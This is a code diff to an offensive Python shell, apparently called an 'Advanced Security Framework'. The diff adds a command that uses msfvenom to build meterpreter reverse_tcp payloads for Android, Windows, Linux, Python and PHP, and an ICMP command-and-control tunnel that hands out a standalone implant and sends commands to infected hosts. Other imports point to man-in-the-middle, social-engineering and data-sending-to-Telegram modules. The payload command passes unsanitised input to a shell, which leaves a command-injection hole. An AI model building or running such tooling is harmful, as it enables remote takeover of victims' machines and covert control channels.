@@ -6,6 +6,7 @@ import threading
 import os
 import readline
 import shutil
+import subprocess
 from modules.steganography import encode_image, decode_image, detect_stego
 from modules.payload import generate_payload
 from modules.network import send_to_server, send_to_telegram
@@ -30,6 +31,8 @@ from modules.lotl_c2 import lotl_agent
 from modules.ape import unleash_ape
 from modules.hare import unleash_hare
 from modules.mitm import MITM
+from modules.icmp_tunnel import send_icmp_command, icmp_c2_listener
+from modules.suggestor import get_suggestions
 
 # --- Shell State ---
 current_target = None
@@ -55,6 +58,8 @@ def print_help():
     print("  lure              - Access the social engineering toolkit")
     print("  covert            - Use the ARP covert payload channel")
     print("  mitm              - Access the ARP poisoning toolkit")
+    print("  icmp              - Use the ICMP C2 Tunnel")
+    print("  generate          - Generate a cross-platform payload (msfvenom)")
     print("  lotl-agent        - Start the LOTL C2 agent")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
@@ -74,6 +79,24 @@ def print_covert_help():
     print("  covert listen [timeout]            - Listen for a raw payload")
     print("  covert generate_listener <path>    - Generate the standalone listener script")
 
+
+def print_generate_help():
+    """Prints the help menu for the generate command."""
+    print("\n--- Cross-Platform Payload Generation (msfvenom) ---")
+    print("Usage: generate <platform> <lhost> <lport> <output_path>")
+    print("\nSupported Platforms:")
+    print("  android       - android/meterpreter/reverse_tcp")
+    print("  windows       - windows/meterpreter/reverse_tcp")
+    print("  linux         - linux/x86/meterpreter/reverse_tcp")
+    print("  python        - python/meterpreter/reverse_tcp")
+    print("  php           - php/meterpreter/reverse_tcp")
+
+def print_icmp_help():
+    """Prints the help menu for the icmp command."""
+    print("\n--- ICMP C2 Tunnel ---")
+    print("  icmp generate <path>      - Generate the standalone implant")
+    print("  icmp listen [timeout]     - Start the C2 listener")
+    print("  icmp send <ip> <cmd>      - Send a command to an implant")
 
 def print_mitm_help():
     """Prints the help menu for the mitm command."""
@@ -174,6 +197,73 @@ def run_covert_command(args):
     else:
         print(f"Unknown covert command: {covert_command}")
         print_covert_help()
+
+def run_generate_command(args):
+    """Handles the generate command and its subcommands."""
+    if len(args) != 4:
+        print_generate_help()
+        return
+
+    platform, lhost, lport, output_path = args
+
+    payloads = {
+        "android": "android/meterpreter/reverse_tcp",
+        "windows": "windows/meterpreter/reverse_tcp",
+        "linux": "linux/x86/meterpreter/reverse_tcp",
+        "python": "python/meterpreter/reverse_tcp",
+        "php": "php/meterpreter/reverse_tcp",
+    }
+
+    if platform not in payloads:
+        print(f"Error: Unsupported platform '{platform}'.")
+        print_generate_help()
+        return
+
+    payload = payloads[platform]
+
+    print(f"Generating payload for {platform}...")
+    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_path}"
+
+    try:
+        subprocess.run(command, shell=True, check=True)
+        print(f"Payload successfully generated at {output_path}")
+    except FileNotFoundError:
+        print("Error: msfvenom is not installed or not in your PATH. Please install Metasploit Framework.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error generating payload: {e}")
+
+def run_icmp_command(args):
+    """Handles the icmp command and its subcommands."""
+    if not args:
+        print_icmp_help()
+        return
+
+    icmp_command = args[0]
+    icmp_args = args[1:]
+
+    if icmp_command == "generate":
+        if len(icmp_args) != 1:
+            print("Usage: icmp generate <output_path>")
+            return
+        output_path = icmp_args[0]
+        try:
+            shutil.copyfile("icmp_implant.py", output_path)
+            print(f"Implant generated at {output_path}")
+        except Exception as e:
+            print(f"Error generating implant: {e}")
+    elif icmp_command == "listen":
+        timeout = int(icmp_args[0]) if icmp_args else 60
+        icmp_c2_listener(timeout)
+    elif icmp_command == "send":
+        if len(icmp_args) < 2:
+            print("Usage: icmp send <target_ip> <command>")
+            return
+        target_ip = icmp_args[0]
+        command = " ".join(icmp_args[1:])
+        send_icmp_command(target_ip, command)
+    else:
+        print(f"Unknown icmp command: {icmp_command}")
+        print_icmp_help()
 
 def run_mitm_command(args):
     """Handles the mitm command and its subcommands."""
@@ -335,6 +425,10 @@ def process_command(cmd_line):
         run_covert_command(args)
     elif command == "mitm":
         run_mitm_command(args)
+    elif command == "icmp":
+        run_icmp_command(args)
+    elif command == "generate":
+        run_generate_command(args)
     elif command == "lotl-agent":
         # ... (lotl-agent logic)
         pass
@@ -350,21 +444,40 @@ def process_command(cmd_line):
 def main():
     """The main interactive loop for the shell."""
     global prompt
+    last_command = ""
     print("--- Welcome to the Advanced Security Framework ---")
     print("Type 'help' for a list of commands.")
+
+    # Initial suggestions
+    suggestions = get_suggestions("", list_targets(), current_target)
+    print("\n💡 Suggestions:")
+    for sug in suggestions:
+        print(f"   - {sug}")
 
     if not sys.stdout.isatty():
         # Non-interactive mode
         for line in sys.stdin:
-            if process_command(line.strip()) == "exit":
+            cmd_line = line.strip()
+            if not cmd_line:
+                continue
+            last_command = cmd_line
+            if process_command(cmd_line) == "exit":
                 break
     else:
         # Interactive mode
         while True:
             try:
-                cmd_line = input(prompt)
+                cmd_line = input(f"\n{prompt}")
+                last_command = cmd_line
                 if process_command(cmd_line) == "exit":
                     break
+
+                # Show suggestions after each command
+                suggestions = get_suggestions(last_command, list_targets(), current_target)
+                print("\n💡 Suggestions:")
+                for sug in suggestions:
+                    print(f"   - {sug}")
+
             except KeyboardInterrupt:
                 print("\nUse 'exit' to leave the shell.")
             except Exception as e:
